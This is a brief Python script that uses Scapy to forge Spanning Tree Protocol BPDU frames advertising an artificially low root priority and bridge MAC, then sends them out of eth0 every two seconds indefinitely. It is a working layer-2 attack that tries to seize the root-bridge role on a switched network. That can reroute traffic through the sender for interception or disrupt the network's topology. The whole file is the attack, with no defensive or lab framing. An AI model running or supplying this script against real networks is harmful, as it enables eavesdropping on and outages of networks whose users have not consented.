from scapy.all import Packet, ByteField, ShortField, BitField, sendp, IntField, Ether, LLC, MACField
import time

# Defining BPDU
class BPDU(Packet):
    name = "BPDU"
    fields_desc = [
        ShortField("protocol_id", 0x00),
        ByteField("version", 0x00),
        ByteField("bpdu_type", 0x00),
        BitField("flags", 0, 8),
        ShortField("root_priority", 0x1000),
        MACField("root_mac", "00:00:00:00:00:01"),
        IntField("root_path_cost", 0),
        ShortField("bridge_priority", 0x1000),
        MACField("bridge_mac", "00:00:00:00:00:01"),
        ShortField("port_id", 0x8001),
        ShortField("message_age", 0),
        ShortField("max_age", 20 << 8),
        ShortField("hello_time", 2 << 8),
        ShortField("forward_delay", 15 << 8)
    ]

# Defining Frame

frame = (
    Ether(dst="01:80:C2:00:00:00", src="00:00:00:00:00:01") / 
    LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
    BPDU()
)

# Exit interface and timer
count = 0
while True:
    count += 1
    sendp(frame, iface="eth0", verbose=False)
    time.sleep(2)
    print(f"Sent {count} BPDU frames")
